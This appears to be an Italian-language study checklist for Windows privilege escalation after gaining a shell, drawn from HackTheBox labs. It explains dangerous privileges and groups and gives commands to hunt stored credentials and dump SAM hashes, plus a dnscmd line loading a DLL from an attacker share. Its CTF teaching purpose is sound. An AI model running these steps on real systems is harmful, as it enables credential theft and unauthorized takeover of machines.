---

tags:

- windows
- privilege-escalation
- post-exploitation
- cheatsheet
- active-directory created: 2026-05-20

---

# Windows Privilege Escalation — Checklist mentale

## 1. Il flow di base post-shell

Appena ottieni una shell come utente non-admin, prima di tutto lanci 4-5 query per **mappare la situazione**. Ogni output è un segnale, anche quando sembra noioso.

```powershell
whoami                          # Chi sono?
whoami /priv                    # Ho privilegi pericolosi?
whoami /groups                  # Sono in gruppi interessanti?
net user $env:USERNAME          # Info dettagliata sul mio account
net user $env:USERNAME /domain  # Info dal punto di vista del dominio
systeminfo                      # OS, build, hotfix
```

> [!tip] La "negazione informativa" Non trovare nulla in questi comandi **è informazione**, non spreco di tempo. Ti dice che certi attack path sono chiusi → cerca altrove. WinPEAS automatizza tutto questo: rosso = sfruttabile, giallo = warning, verde = info.

---

## 2. whoami /priv — la lista dei privilegi pericolosi

Esiste una lista relativamente piccola di privilegi Windows che permettono priv esc diretta. **Memorizzane la struttura, non i nomi esatti** — quando ne vedi uno, riconosci che è una bandiera rossa.

### Privilegi GOLD (priv esc immediata)

|Privilegio|Cosa permette|Attacco|
|---|---|---|
|**SeImpersonatePrivilege**|Impersonare token di altri utenti|**Potato attacks** (JuicyPotato, PrintSpooler, RoguePotato, GodPotato) — classico path da service account → SYSTEM|
|**SeAssignPrimaryTokenPrivilege**|Assegnare token primari ai processi|Stesso family dei Potato|
|**SeTcbPrivilege**|"Act as part of the OS"|Quasi-SYSTEM, attacchi multipli|
|**SeCreateTokenPrivilege**|Creare access token arbitrari|Forgia il tuo token da SYSTEM|

> [!warning] SeImpersonate è il classico Quasi tutti i service account (IIS pool, MSSQL service, ecc.) hanno SeImpersonate. Quando vedi una shell come `nt service\mssqlserver` o `iis apppool\defaultapppool`, controlla subito `whoami /priv` — se SeImpersonate è enabled → Potato → SYSTEM.

### Privilegi SILVER (priv esc via file/registry access)

|Privilegio|Cosa permette|Attacco|
|---|---|---|
|**SeBackupPrivilege**|Leggere QUALSIASI file (bypass ACL)|Dump SAM + SYSTEM hive → `secretsdump -sam SAM -system SYSTEM LOCAL` → estrai NT hash locali|
|**SeRestorePrivilege**|Scrivere QUALSIASI file|Sovrascrivi binari di sistema, DLL hijacking, modifica `utilman.exe`|
|**SeTakeOwnershipPrivilege**|Prendere ownership di qualsiasi oggetto|Acquisisci file protetti, poi modifica ACL|
|**SeDebugPrivilege**|Aprire qualsiasi processo per debug|Mimikatz mode → leggi memoria LSASS, dump credenziali|
|**SeLoadDriverPrivilege**|Caricare driver kernel|Carica driver vulnerabile firmato (`Capcom.sys` etc.) → kernel exec|
|**SeManageVolumePrivilege**|Gestire volumi storage|Accesso raw disk|

### Privilegi RUMORE (ce li hanno tutti, ignora)

|Privilegio|Significato|
|---|---|
|SeChangeNotifyPrivilege|Bypass traverse checking — ce l'ha ogni utente|
|SeIncreaseWorkingSetPrivilege|Memoria del proprio processo — niente|
|SeShutdownPrivilege|Spegnere il PC — fastidioso ma non priv esc|
|SeTimeZonePrivilege|Cambiare timezone — irrilevante|
|SeUndockPrivilege|Undock laptop — irrilevante|

### Privilegi GRIGI (contesto specifico)

|Privilegio|Quando è sfruttabile|
|---|---|
|**SeMachineAccountPrivilege**|Join workstation al dominio. **Abusabile per RBCD** (Resource-Based Constrained Delegation) in scenari specifici|
|SeSecurityPrivilege|Gestione log audit — utile per coprire tracce, non priv esc|
|SeSystemtimePrivilege|Cambiare l'ora — abusabile per certi attacchi Kerberos (clock skew)|

> [!note] Casi reali
> 
> - **HTB Sauna (fsmith)** — Solo SeChangeNotify, SeIncreaseWorkingSet, SeMachineAccount → tutti rumore o grigi → priv esc via privilegi **esclusa** → cercato altrove (registry Winlogon)
> - **HTB Forest (svc-alfresco)** — Stessa situazione, niente privilegi GOLD → cercato altrove (BloodHound ACL)
> - **Box con service account** — Spesso SeImpersonate enabled → Potato → SYSTEM

---

## 3. whoami /groups — i gruppi da scannare

### Privilegiati diretti — game over

Se sei in uno di questi, sei già admin di fatto:

- `Domain Admins`
- `Enterprise Admins`
- `Schema Admins`
- `BUILTIN\Administrators`

### Operatori delegati — permessi specifici sfruttabili

|Gruppo|Cosa permette|
|---|---|
|**Backup Operators**|Backup/restore di file → equivale a SeBackup+SeRestore → dump SAM|
|**Server Operators**|Modificare servizi → cambia un servizio per eseguire codice come SYSTEM|
|**Account Operators**|Creare/modificare account non-admin → può escalare in certi scenari|
|**Print Operators**|Gestire stampanti → caricare driver malevolo|
|**DNS Admins**|Caricare DLL nel servizio DNS (gira come SYSTEM) → DLL injection → SYSTEM|
|**Hyper-V Administrators**|Pieno controllo VM — può accedere a hash via VM offline|
|**Remote Desktop Users**|Login via RDP|
|**Remote Management Users**|Login via WinRM (port 5985)|

> [!tip] DNS Admins è famigerato Il gruppo `DNSAdmins` ha il privilegio di caricare una DLL custom nel servizio DNS, che gira come SYSTEM. Comando: `dnscmd.exe /config /serverlevelplugindll \\attacker\share\malicious.dll`. Path classico verso DA in molti AD.

### Gruppi specifici di Active Directory

- `Authenticated Users` — chiunque sia loggato
- `Domain Users` — qualsiasi utente del dominio
- `Pre-Windows 2000 Compatible Access` — legacy, spesso significa solo "Authenticated Users"
- `Cert Publishers` — può pubblicare certificati (rilevante per ADCS)
- `Protected Users` — gruppo difensivo, restringe attacchi NTLM/Kerberos

### Custom dell'organizzazione

Gruppi tipo `IT-Helpdesk`, `Backup-Team`, `DevOps-Engineers` — **sempre da investigare con BloodHound**. Spesso hanno ACL custom che permettono modifiche su altri account.

### Mandatory Integrity Level

```
Mandatory Label\... Mandatory Level
```

|Livello|Significato|
|---|---|
|Untrusted|Sandbox|
|Low|Browser, app contenute|
|**Medium**|Utente normale|
|**Medium Plus**|Utente standard (RDP, WinRM users)|
|High|Admin con UAC|
|**System**|SYSTEM / processi kernel|

> [!note] UAC bypass Su una macchina con utente in Administrators, l'integrity level è Medium fino a quando non passi UAC. Tecniche di UAC bypass (Fodhelper, ComputerDefaults, ecc.) servono a passare da Medium → High senza prompt.

---

## 4. Lettura rapida — esempi commentati

### Esempio 1 — fsmith su HTB Sauna

```
Privileges:
  SeMachineAccountPrivilege     Add workstations to domain     Enabled
  SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
  SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

Groups:
  BUILTIN\Remote Management Users
  BUILTIN\Users
  Authenticated Users
  Medium Plus Mandatory Level
```

**Lettura mentale in 5 secondi:**

- Privilegi: tutti baseline → priv esc via privilegi **ESCLUSA**
- Gruppi: utente standard con WinRM access → niente delegati interessanti
- Conclusione: cerco altrove → stored credentials, BloodHound ACL, software vuln

### Esempio 2 — service account con SeImpersonate

```
Privileges:
  SeAssignPrimaryTokenPrivilege  Replace a process level token  Enabled
  SeIncreaseQuotaPrivilege       Adjust memory quotas           Enabled
  SeChangeNotifyPrivilege        Bypass traverse checking       Enabled
  SeImpersonatePrivilege         Impersonate a client           Enabled
  SeCreateGlobalPrivilege        Create global objects          Enabled
```

**Lettura mentale:**

- `SeImpersonate` + `SeAssignPrimaryToken` → **GOLD** → Potato attack → SYSTEM in 2 minuti
- È una shell di un service account (IIS o SQL)
- Stop, eseguo PrintSpoofer/GodPotato

### Esempio 3 — Backup Operator

```
Groups:
  BUILTIN\Backup Operators
  BUILTIN\Users
```

**Lettura mentale:**

- Backup Operators → posso leggere SAM/SYSTEM nonostante non sia admin
- `reg save HKLM\SAM SAM.hive` + `reg save HKLM\SYSTEM SYSTEM.hive`
- Trasferisco i file, `impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL`
- Estraggo NT hash locali → PtH su altre macchine

---

## 5. Dove cercare quando privilegi/gruppi sono "noiosi"

Se whoami è tutto rumore, l'attack path passa altrove. La checklist generale:

### 5a. Stored credentials

|Posizione|Comando|
|---|---|
|Winlogon autologon|`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`|
|Credential Manager|`cmdkey /list`|
|Unattend / Sysprep|`dir /s C:\Unattend.xml C:\sysprep.xml`|
|File di config|`findstr /si "password" *.xml *.ini *.txt *.config`|
|PowerShell history|`type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`|
|Putty saved sessions|`reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"`|

### 5b. ACL anomale (BloodHound)

```bash
bloodhound-python -u USER -p 'PASS' -d DOMINIO -dc DC_FQDN -ns DC_IP -c All
```

In BloodHound CE → cerca il tuo utente → **Outbound Object Control** → se > 0, investiga.

### 5c. Servizi vulnerabili

|Cosa cercare|Comando|
|---|---|
|Servizi con path scrivibili|`accesschk.exe -uwcqv "Users" *` (sysinternals)|
|Servizi con unquoted path|`wmic service get name,pathname` → cerca path con spazi senza virgolette|
|Service binary modificabile|WinPEAS lo fa automaticamente|

### 5d. Token impersonation senza SeImpersonate

- **RoguePotato/PrintSpoofer/GodPotato** — versioni moderne dei Potato per Win10/11
- Funzionano solo se hai `SeImpersonatePrivilege` però. Senza, no.

### 5e. Kernel exploits

- `systeminfo` → guarda OS, build, hotfix installati
- [Watson](https://github.com/rasta-mouse/Watson), [Wesng](https://github.com/bitsadmin/wesng) → tools che mappano build → CVE noti
- Sempre ultima risorsa: instabili, AV-detected, ma sui CTF a volte sono l'unica via

---

## 6. Cheatsheet finale

```powershell
# Step 1: chi sono
whoami
whoami /priv
whoami /groups

# Step 2: ambiente
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
net users
net localgroup administrators

# Step 3: stored creds
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
cmdkey /list

# Step 4: rete
ipconfig /all
arp -a
netstat -ano

# Step 5: WinPEAS (se hai upload)
# upload winpeas.exe → .\winpeas.exe
```

---

## Takeaways

> [!abstract] I punti chiave
> 
> 1. **Ogni output ha valore**: non trovare privilegi pericolosi ti dice che quel path è chiuso, non che hai fatto la query a vuoto
> 2. **La lista dei privilegi GOLD è breve**: SeImpersonate, SeBackup, SeDebug, SeLoadDriver, SeTakeOwnership, SeRestore. Riconosci questi e hai già metà del lavoro
> 3. **I service account hanno spesso SeImpersonate**: se vedi una shell come servizio, controlla subito
> 4. **WinPEAS automatizza tutto**: ma capire cosa cerca rende l'output 10x più utile
> 5. **Privilegi/gruppi noiosi → cerca stored credentials**: Winlogon, Credential Manager, file di config. È il path "Sauna pattern"

---

## Vedi anche

- [[htb_sauna]] — esempio concreto di "privilegi/gruppi noiosi → cerca registry"
- [[impacket]] — secretsdump per estrarre hash da SAM/SYSTEM hive
- [[credential_dumping_lsa_vs_lsass]] — cosa puoi estrarre con SeDebug
- [[windows_enterprise_architecture]] — gruppi AD e loro permessi
- [[getnpusers_asrep_roasting]] — uno degli attacchi che facilita la initial access